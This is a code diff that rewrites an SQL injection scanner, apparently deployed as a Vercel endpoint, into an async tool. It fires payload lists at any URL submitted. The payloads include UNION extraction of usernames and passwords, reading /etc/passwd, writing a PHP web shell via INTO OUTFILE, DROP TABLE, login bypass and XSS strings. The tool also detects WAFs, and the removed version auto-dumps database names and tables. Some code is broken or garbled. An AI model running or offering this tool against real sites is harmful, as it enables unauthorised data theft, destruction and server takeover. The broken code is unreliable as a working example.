@@ -1,195 +1,474 @@
-#!/usr/bin/env python3
-"""
-/api/scan.py – Enhanced SQLi Scanner
-Menampilkan:
-1. Multiple payloads with detailed results
-2. Complete test URLs
-3. Automatic dumping (version, db, tables)
-4. Detailed vulnerability information
-"""
-import urllib.parse, json, socket, ssl, re
+import asyncio
+import aiohttp
+import re
+import time
+import urllib.parse
+from typing import List, Dict, Any
+import logging
 
-TIMEOUT = 8
-VERBOSE_DUMP = True
+# Configure logging
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
 
-def send_get(url):
-    p = urllib.parse.urlparse(url)
-    host = p.hostname
-    port = 443 if p.scheme == 'https' else 80
-    path = p.path + ('?' + p.query if p.query else '')
-    sock = socket.socket()
-    sock.settimeout(TIMEOUT)
-    if p.scheme == 'https':
-        sock = ssl.create_default_context().wrap_socket(sock, server_hostname=host)
-    sock.connect((host, port))
-    req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\nUser-Agent: SVRIOT/4.0\r\n\r\n"
-    sock.send(req.encode())
-    resp = sock.recv(8192).decode(errors='ignore')
-    sock.close()
-    return resp
-
-def quick_dump(base, param, value):
-    dumps = {}
-    # Version detection with multiple techniques
-    payloads = [
-        f"{base}?{param}={value}' UNION SELECT 1,@@version,3-- -",
-        f"{base}?{param}={value}' UNION SELECT 1,version(),3-- -",
-        f"{base}?{param}={value}' UNION SELECT 1,dbms_version,3 FROM v$instance-- -"
-    ]
-    
-    for p in payloads:
-        res = send_get(p)
-        ver = re.findall(r'([0-9]+\.[0-9]+\.[0-9]+)', res)
-        if ver:
-            dumps['version'] = {"payload": p, "result": ver[0]}
-            break
-    else:
-        dumps['version'] = {"payload": payloads[0], "result": "N/A"}
-
-    # Database name with multiple techniques
-    payloads = [
-        f"{base}?{param}={value}' UNION SELECT 1,database(),3-- -",
-        f"{base}?{param}={value}' UNION SELECT 1,current_database(),3-- -",
-        f"{base}?{param}={value}' UNION SELECT 1,global_name FROM global_name-- -"
-    ]
-    
-    for p in payloads:
-        res = send_get(p)
-        db = re.findall(r'([A-Za-z0-9_-]+)</', res)
-        if db:
-            dumps['database'] = {"payload": p, "result": db[0]}
-            break
-    else:
-        dumps['database'] = {"payload": payloads[0], "result": "N/A"}
-
-    # Tables extraction
-    payloads = [
-        f"{base}?{param}={value}' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -",
-        f"{base}?{param}={value}' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1-- -",
-        f"{base}?{param}={value}' UNION SELECT 1,object_name,3 FROM all_objects WHERE object_type='TABLE'-- -"
-    ]
-    
-    for p in payloads:
-        res = send_get(p)
-        tbl = re.findall(r'([A-Za-z0-9_,]+)</', res)
-        if tbl:
-            dumps['tables'] = {"payload": p, "result": tbl[0].split(',')}
-            break
-    else:
-        dumps['tables'] = {"payload": payloads[0], "result": []}
-
-    return dumps
-
-def test_payloads(base, param, value):
-    payloads = [
-        {
-            "name": "Error-based (Single Quote)",
-            "payload": f"{base}?{param}={value}'-- -",
-            "type": "error-based",
-            "check": lambda r: any(k in r.lower() for k in ["mysql","syntax","warning","error"])
-        },
-        {
-            "name": "Boolean-Based (AND 1=1)",
-            "payload": f"{base}?{param}={value}' AND 1=1-- -",
-            "type": "boolean",
-            "check": lambda r: len(r)
-        },
-        {
-            "name": "Time-Based (SLEEP)",
-            "payload": f"{base}?{param}={value}' AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -",
-            "type": "time-based",
-            "check": lambda r: "syntax" not in r.lower()
-        },
-        {
-            "name": "UNION-Based (Simple)",
-            "payload": f"{base}?{param}={value}' UNION SELECT 1,2,3-- -",
-            "type": "union",
-            "check": lambda r: any(str(i) in r for i in [1,2,3])
-        },
-        {
-            "name": "Stacked Queries",
-            "payload": f"{base}?{param}={value}'; SELECT 1-- -",
-            "type": "stacked",
-            "check": lambda r: "error" not in r.lower()
+class SQLInjectionScanner:
+    def __init__(self):
+        self.session = None
+        self.payloads = {
+            'error_based': [
+                "'",
+                "''",
+                "' OR '1'='1",
+                "' OR 1=1--",
+                "' UNION SELECT NULL--",
+                "' UNION SELECT NULL,NULL--",
+                "' UNION SELECT NULL,NULL,NULL--",
+                "' AND 1=CONVERT(int,@@version)--",
+                "'; DROP TABLE users; --",
+                "' OR 1=1#",
+                "' UNION SELECT user(),database(),version()--",
+                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
+                "' OR 1=1 LIMIT 1--",
+                "' UNION SELECT table_name FROM information_schema.tables--",
+                "' UNION SELECT column_name FROM information_schema.columns--",
+                "' UNION SELECT username,password FROM users--",
+                "' AND 1=2 UNION SELECT * FROM admin--",
+                "' OR 1=1 ORDER BY 1--",
+                "' OR 1=1 ORDER BY 2--",
+                "' OR 1=1 ORDER BY 3--",
+                "' OR 1=1 GROUP BY 1--",
+                "' HAVING 1=1--",
+                "' AND 1=1--",
+                "' AND 1=2--",
+                "' OR SLEEP(5)--",
+                "' OR pg_sleep(5)--",
+                "'; WAITFOR DELAY '0:0:5'--",
+                "' OR 1=1 INTO OUTFILE '/tmp/test.txt'--",
+                "' UNION SELECT load_file('/etc/passwd')--",
+                "' UNION SELECT '<?php system($_GET[cmd]);?>' INTO OUTFILE '/var/www/shell.php'--",
+                "' OR 1=1 UNION SELECT NULL,NULL,NULL--",
+                "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
+            ],
+            'blind': [
+                "' AND 1=1--",
+                "' AND 1=2--",
+                "' AND SLEEP(5)--",
+                "' AND (SELECT COUNT(*) FROM users)>0--",
+                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
+                "' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",
+                "' AND ASCII(SUBSTRING((SELECT database()),1,1))=115--",
+                "' AND IF(1=1,SLEEP(5),0)--",
+                "' AND CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END--",
+                "' AND 1=(SELECT COUNT(*) FROM users WHERE username='admin')--",
+                "' AND (SELECT LENGTH(database()))>5--",
+                "' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>5--",
+            ],
+            'time_based': [
+                "'; WAITFOR DELAY '0:0:5'--",
+                "' OR pg_sleep(5)--",
+                "'; SELECT pg_sleep(5)--",
+                "' OR SLEEP(5)--",
+                "' AND (SELECT COUNT(*) FROM users WHERE SLEEP(5))--",
+                "' OR IF(1=1,SLEEP(5),0)--",
+                "' OR (SELECT CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END)--",
+                "' OR (SELECT COUNT(*) FROM information_schema.tables WHERE SLEEP(5))--",
+            ],
+            'union_based': [
+                "' UNION SELECT NULL--",
+                "' UNION SELECT NULL,NULL--",
+                "' UNION SELECT NULL,NULL,NULL--",
+                "' UNION SELECT 1,2,3--",
+                "' UNION SELECT user(),database(),version()--",
+                "' UNION SELECT table_name,NULL FROM information_schema.tables--",
+                "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
+                "' UNION SELECT username,password FROM users--",
+                "' UNION SELECT * FROM admin--",
+                "' UNION SELECT load_file('/etc/passwd'),NULL--",
+                "' UNION SELECT @@version,NULL,NULL--",
+                "' UNION SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema=database()--",
+            ],
+            'auth_bypass': [
+                "' OR '1'='1",
+                "' OR 1=1--",
+                "' OR 1=1#",
+                "admin'--",
+                "admin' #",
+                "admin'/*",
+                "' or 1=1 or ''='",
+                "' or 1=1--",
+                "' or 1=1#",
+                "' or 1=1/*",
+                "') or '1'='1--",
+                "') or ('1'='1--",
+                "1' OR '1'='1",
+                "1' OR 1 -- -",
+                "1' OR 1=1--",
+                "1' OR 1=1#",
+                "1' OR 1=1/*",
+                "1'admin' OR '1'='1",
+                "1' or '1'='1",
+                "1' or 1 -- -",
+                "1' or 1=1--",
+                "1' or 1=1#",
+                "1' or 1=1/*",
+            ],
+            'xss_combo': [
+                "'><script>alert('XSS')</script>",
+                "'><img src=x onerror=alert('XSS')>",
+                "'><svg/onload=alert('XSS')>",
+                "'; DROP TABLE users; -- <script>alert('XSS')</script>",
+                "' UNION SELECT '<script>alert(1)</script>',NULL--",
+                "' OR 1=1; <script>alert('XSS')</script>--",
+                "'><iframe src=javascript:alert('XSS')>",
+                "'"><script>document.cookie='hacked=1'</script>",
+                "'><body onload=alert('XSS')>",
+                "'><div onmouseover=alert('XSS')>hover me</div>",
+            ]
         }
-    ]
-    
-    results = []
-    for p in payloads:
-        try:
-            res = send_get(p["payload"])
-            vulnerable = p["check"](res)
-            results.append({
-                "name": p["name"],
-                "payload": p["payload"],
-                "type": p["type"],
-                "vulnerable": vulnerable,
-                "response_snippet": res[:200] + "..." if len(res) > 200 else res
-            })
-        except:
-            results.append({
-                "name": p["name"],
-                "payload": p["payload"],
-                "type": p["type"],
-                "vulnerable": False,
-                "error": "Request failed"
-            })
-    
-    return results
 
-def scan(url):
-    p = urllib.parse.urlparse(url)
-    qs = dict(urllib.parse.parse_qsl(p.query))
-    if not qs:
-        return {"status":"error","detail":"URL harus punya query string"}
-    
-    base = url.split('?')[0]
-    param, value = next(iter(qs.items()))
-    
-    # Test all payloads
-    payload_results = test_payloads(base, param, value)
-    vulnerable_payloads = [p for p in payload_results if p["vulnerable"]]
-    
-    if not vulnerable_payloads:
-        return {
-            "status": "safe",
-            "detail": "Tidak ditemukan SQLi yang jelas",
-            "payloads": payload_results,
-            "tech_details": {
-                "parameter": param,
-                "dbms": "Unknown",
-                "technique": "None detected"
+    async def create_session(self):
+        connector = aiohttp.TCPConnector(limit=100, limit_per_host=30)
+        timeout = aiohttp.ClientTimeout(total=30)
+        self.session = aiohttp.ClientSession(
+            connector=connector,
+            timeout=timeout,
+            headers={
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                'Accept-Language': 'en-US,en;q=0.5',
+                'Accept-Encoding': 'gzip, deflate',
+                'Connection': 'keep-alive',
+                'Upgrade-Insecure-Requests': '1'
             }
+        )
+
+    async def close_session(self):
+        if self.session:
+            await self.session.close()
+
+    async def detect_waf(self, url: str) -> bool:
+        """Detect if WAF is present"""
+        waf_payloads = [
+            "' AND 1=1 UNION ALL SELECT 1,2,3,table_name FROM information_schema.tables --",
+            "<script>alert('XSS')</script>",
+            "' OR 1=1--",
+            "'; DROP TABLE users; --"
+        ]
+        
+        for payload in waf_payloads[:2]:
+            test_url = self.inject_payload(url, payload)
+            try:
+                async with self.session.get(test_url) as response:
+                    text = await response.text()
+                    waf_signatures = [
+                        'cloudflare', 'akamai', 'sucuri', 'incapsula',
+                        'fortinet', 'f5', 'barracuda', 'mod_security',
+                        'access denied', 'forbidden', 'blocked',
+                        'security violation', 'waf', 'firewall'
+                    ]
+                    if any(sig.lower() in text.lower() for sig in waf_signatures):
+                        return True
+            except:
+                continue
+        return False
+
+    def inject_payload(self, url: str, payload: str) -> str:
+        """Inject payload into URL parameters"""
+        parsed = urllib.parse.urlparse(url)
+        params = urllib.parse.parse_qs(parsed.query)
+        
+        if not params:
+            return url
+        
+        # Inject into first parameter
+        first_param = list(params.keys())[0]
+        params[first_param] = [payload]
+        
+        new_query = urllib.parse.urlencode(params, doseq=True)
+        new_url = urllib.parse.urlunparse((
+            parsed.scheme, parsed.netloc, parsed.path,
+            parsed.params, new_query, parsed.fragment
+        ))
+        
+        return new_url
+
+    async def test_payload(self, url: str, payload: str, payload_type: str) -> Dict[str, Any]:
+        """Test a single payload"""
+        test_url = self.inject_payload(url, payload)
+        
+        try:
+            start_time = time.time()
+            async with self.session.get(test_url) as response:
+                response_time = time.time() - start_time
+                text = await response.text()
+                
+                # Error-based detection
+                error_patterns = [
+                    r'SQL syntax.*MySQL',
+                    r'Warning.*mysql_.*',
+                    r'valid MySQL result',
+                    r'MySqlClient\.',
+                    r'PostgreSQL.*ERROR',
+                    r'Warning.*pg_.*',
+                    r'valid PostgreSQL result',
+                    r'Npgsql\.',
+                    r'Driver.*SQL.*Server',
+                    r'OLE DB.*SQL Server',
+                    r'(\W|\A)SQL.*Server.*Driver',
+                    r'Warning.*mssql_.*',
+                    r'(\W|\A)SQL.*Server.*[0-9a-fA-F]{8}',
+                    r'Exception.*Oracle',
+                    r'Oracle error',
+                    r'Oracle.*Driver',
+                    r'Warning.*oci_.*',
+                    r'Warning.*ora_.*',
+                    r'Microsoft.*OLE.*DB.*Oracle',
+                    r'Microsoft.*OLE.*DB.*SQL.*Server',
+                    r'SQLite/JDBCDriver',
+                    r'SQLite.*Driver',
+                    r'Warning.*sqlite_.*',
+                    r'Warning.*SQLite3::',
+                    r'
+ $$SQLite_ERROR$$ ',
+                    r'SQLite.*exception',
+                    r'org\.sqlite\.JDBC',
+                    r'PDOException',
+                    r'DB2 SQL error',
+                    r'DB2.*Driver',
+                    r'Warning.*db2_.*',
+                    r'Sybase.*Server.*message',
+                    r'Sybase.*Driver',
+                    r'Warning.*sybase_.*',
+                    r'XPathException',
+                    r'Warning.*SimpleXMLElement::',
+                    r'Warning.*preg_.*',
+                    r'Warning.*Division by zero',
+                    r'Warning.*file_.*',
+                    r'Failed opening.*for inclusion',
+                    r'Warning.*include.*failed',
+                    r'Warning.*require.*failed',
+                    r'fatal error',
+                    r'unexpected T_.* in',
+                    r'Parse error',
+                    r'Warning:.*',
+                    r'Error:.*',
+                    r'Notice:.*'
+                ]
+                
+                # Check for SQL errors
+                for pattern in error_patterns:
+                    if re.search(pattern, text, re.IGNORECASE):
+                        return {
+                            'type': 'Error-Based SQL Injection',
+                            'severity': 'Critical',
+                            'parameter': urllib.parse.parse_qs(urllib.parse.urlparse(test_url).query).keys()[0],
+                            'payload': payload,
+                            'description': f'Database error detected: {pattern}',
+                            'usage': f'Use payload: {payload} in {urllib.parse.parse_qs(urllib.parse.urlparse(test_url).query).keys()[0]} parameter'
+                        }
+                
+                # Time-based detection
+                if payload_type == 'time_based' and response_time > 4:
+                    return {
+                        'type': 'Time-Based Blind SQL Injection',
+                        'severity': 'High',
+                        'parameter': urllib.parse.parse_qs(urllib.parse.urlparse(test_url).query).keys()[0],
+                        'payload': payload,
+                        'description': f'Delayed response detected ({response_time:.2f}s)',
+                        'usage': f'Test with: {test_url}'
+                    }
+                
+                # Union-based detection
+                if payload_type == 'union_based':
+                    # Look for injection markers in response
+                    union_indicators = ['1', '2', '3', 'user()', 'database()', 'version()']
+                    for indicator in union_indicators:
+                        if indicator in text and indicator in payload:
+                            return {
+                                'type': 'Union-Based SQL Injection',
+                                'severity': 'High',
+                                'parameter': urllib.parse.parse_qs(urllib.parse.urlparse(test_url).query).keys()[0],
+                                'payload': payload,
+                                'description': 'Union injection successful - data reflected in response',
+                                'usage': f'Enumerate data with: {payload.replace("NULL", "table_name")} FROM information_schema.tables'
+                            }
+                
+                # Blind detection
+                if payload_type == 'blind':
+                    # Check for different responses
+                    normal_url = self.inject_payload(url, "1")
+                    async with self.session.get(normal_url) as normal_response:
+                        normal_text = await normal_response.text()
+                        
+                        if len(text) != len(normal_text) or text != normal_text:
+                            return {
+                                'type': 'Blind SQL Injection',
+                                'severity': 'Medium',
+                                'parameter': urllib.parse.parse_qs(urllib.parse.urlparse(test_url).query).keys()[0],
+                                'payload': payload,
+                                'description': 'Different response detected - potential blind injection',
+                                'usage': f'Use boolean conditions: {payload} AND 1=1 vs {payload} AND 1=2'
+                            }
+                
+                # Auth bypass detection
+                if payload_type == 'auth_bypass':
+                    # Look for successful login indicators
+                    success_indicators = ['welcome', 'dashboard', 'profile', 'logout', 'success']
+                    for indicator in success_indicators:
+                        if indicator.lower() in text.lower():
+                            return {
+                                'type': 'Authentication Bypass',
+                                'severity': 'Critical',
+                                'parameter': urllib.parse.parse_qs(urllib.parse.urlparse(test_url).query).keys()[0],
+                                'payload': payload,
+                                'description': 'Authentication bypass successful',
+                                'usage': f'Test login bypass: username=admin{payload}&password=anything'
+                            }
+                
+                # XSS combo detection
+                if payload_type == 'xss_combo':
+                    xss_indicators = ['<script>', 'alert(', 'onerror=', 'onload=']
+                    for indicator in xss_indicators:
+                        if indicator in text:
+                            return {
+                                'type': 'XSS + SQLi Combo',
+                                'severity': 'High',
+                                'parameter': urllib.parse.parse_qs(urllib.parse.urlparse(test_url).query).keys()[0],
+                                'payload': payload,
+                                'description': 'XSS payload reflected in response',
+                                'usage': f'Full payload: {payload}'
+                            }
+                
+        except asyncio.TimeoutError:
+            return {
+                'type': 'Time-Based SQL Injection',
+                'severity': 'Medium',
+                'parameter': urllib.parse.parse_qs(urllib.parse.urlparse(test_url).query).keys()[0],
+                'payload': payload,
+                'description': 'Request timeout - potential time-based injection',
+                'usage': f'Test timeout with: {test_url}'
+            }
+        except Exception as e:
+            logger.error(f"Error testing payload {payload}: {str(e)}")
+        
+        return None
+
+    async def scan_url(self, url: str, options: Dict[str, bool]) -> Dict[str, Any]:
+        """Main scanning function"""
+        await self.create_session()
+        
+        try:
+            # Detect WAF
+            waf_detected = await self.detect_waf(url)
+            
+            vulnerabilities = []
+            payloads_tested = 0
+            
+            # Test selected payload types
+            for payload_type, enabled in options.items():
+                if enabled and payload_type in self.payloads:
+                    payloads = self.payloads[payload_type]
+                    
+                    # Use semaphore for rate limiting
+                    semaphore = asyncio.Semaphore(10)
+                    
+                    async def test_with_semaphore(payload):
+                        async with semaphore:
+                            return await self.test_payload(url, payload, payload_type)
+                    
+                    # Test payloads concurrently
+                    tasks = [test_with_semaphore(payload) for payload in payloads]
+                    results = await asyncio.gather(*tasks, return_exceptions=True)
+                    
+                    for result in results:
+                        if isinstance(result, dict) and result:
+                            vulnerabilities.append(result)
+                        payloads_tested += 1
+                    
+                    # Add delay if WAF detected
+                    if waf_detected:
+                        await asyncio.sleep(1)
+            
+            return {
+                'url': url,
+                'waf_detected': waf_detected,
+                'vulnerabilities': vulnerabilities,
+                'payloads_tested': payloads_tested,
+                'scan_timestamp': time.time()
+            }
+            
+        finally:
+            await self.close_session()
+
+# Vercel serverless handler
+async def handler(request):
+    if request.method == 'OPTIONS':
+        return {
+            'statusCode': 200,
+            'headers': {
+                'Access-Control-Allow-Origin': '*',
+                'Access-Control-Allow-Methods': 'POST, OPTIONS',
+                'Access-Control-Allow-Headers': 'Content-Type',
+            },
+            'body': ''
         }
     
-    # Get most effective payload
-    best_payload = vulnerable_payloads[0]
-    tech_type = best_payload["type"]
+    if request.method != 'POST':
+        return {
+            'statusCode': 405,
+            'headers': {
+                'Access-Control-Allow-Origin': '*',
+                'Content-Type': 'application/json'
+            },
+            'body': json.dumps({'error': 'Method not allowed'})
+        }
     
-    # Auto dumping for vulnerable sites
-    dump_data = quick_dump(base, param, value) if VERBOSE_DUMP else {}
-    
-    return {
-        "status": "vuln",
-        "detail": f"Vulnerable to {tech_type} SQL injection",
-        "payloads": payload_results,
-        "tech_details": {
-            "type": tech_type,
-            "parameter": param,
-            "dbms": dump_data.get('version', {}).get('result', 'Unknown'),
-            "technique": best_payload["name"],
-            "confidence": "High"
-        },
-        "auto_dump": dump_data,
-        "next_steps": [
-            "Gunakan sqlmap untuk eksploitasi lebih lanjut",
-            f"Gunakan payload: {best_payload['payload']}",
-            "Coba dump lebih banyak data dengan UNION SELECT"
-        ]
-    }
+    try:
+        body = await request.json()
+        url = body.get('url')
+        options = body.get('options', {})
+        
+        if not url:
+            return {
+                'statusCode': 400,
+                'headers': {
+                    'Access-Control-Allow-Origin': '*',
+                    'Content-Type': 'application/json'
+                },
+                'body': json.dumps({'error': 'URL is required'})
+            }
+        
+        scanner = SQLInjectionScanner()
+        result = await scanner.scan_url(url, options)
+        
+        return {
+            'statusCode': 200,
+            'headers': {
+                'Access-Control-Allow-Origin': '*',
+                'Content-Type': 'application/json'
+            },
+            'body': json.dumps(result, indent=2)
+        }
+        
+    except Exception as e:
+        logger.error(f"Handler error: {str(e)}")
+        return {
+            'statusCode': 500,
+            'headers': {
+                'Access-Control-Allow-Origin': '*',
+                'Content-Type': 'application/json'
+            },
+            'body': json.dumps({'error': str(e)})
+        }
 
-def handler(event, context=None):
-    url = urllib.parse.parse_qs(event.get('queryString', '')).get('url', [''])[0]
-    if not url:
-        return {"statusCode": 400, "body": json.dumps({"status":"error","detail":"url param wajib"})}
-    return {"statusCode": 200, "body": json.dumps(scan(url), indent=2)}
+# For Vercel
+import json
+from aiohttp import web
+
+async def vercel_handler(request):
+    return await handler(request)
+
+# For local development
+if __name__ == '__main__':
+    app = web.Application()
+    app.router.add_post('/api/scan', vercel_handler)
+    web.run_app(app, port=8000)
